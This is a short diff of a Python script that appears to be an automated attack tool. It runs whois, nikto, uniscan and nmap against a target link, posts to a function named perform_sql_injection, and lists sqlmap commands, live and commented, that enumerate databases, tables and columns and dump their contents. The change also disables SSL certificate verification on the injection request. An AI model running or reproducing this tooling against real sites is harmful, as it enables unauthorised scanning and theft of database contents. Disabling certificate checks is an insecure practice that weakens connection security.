@@ -84,7 +84,7 @@ def perform_sql_injection(target_url):
             'password': 'password'  # Update with the correct password field if needed
         }
         
-        response = requests.post(target_url, data=data)
+        response = requests.post(target_url, data=data, verify=False)  # Disabled SSL verification
         print(response.text)  # This will display the extracted data, handle it as you wish
 
 def main():
@@ -114,7 +114,7 @@ def main():
         "whois": ["whois", link],
         "nikto": ["nikto", "-h", link],
         "uniscan": ["uniscan", "-u", link, "-qd"],
-        "nmap": ["nmap", link],
+        "nmap": ["nmap", link]
     }
 
     total_tools = len(tools)
@@ -134,14 +134,11 @@ def main():
 
     # Execute additional SQLMap commands to retrieve database information
     additional_sqlmap_commands = [
-        f"sqlmap -u {link_with_https} --dbs",
+        f"sqlmap -u {link_with_https} --dbs"
         # These commands need to be executed after retrieving the database and table names
         # f"sqlmap -u {link_with_https} -D <nome_del_database> --tables",
         # f"sqlmap -u {link_with_https} -D <nome_del_database> -T <nome_della_tabella> --columns",
-        # f"sqlmap -u {link
-                # These commands need to be executed after retrieving the database and table names
-        # f"sqlmap -u {link_with_https} -D <nome_del_database> --tables",
-        # f"sqlmap -u {link_with_https} -D <nome_del_database> -T <nome_della_tabella> --columns",
+
         # f"sqlmap -u {link_with_https} -D <nome_del_database> -T <nome_della_tabella> --dump"
     ]
 
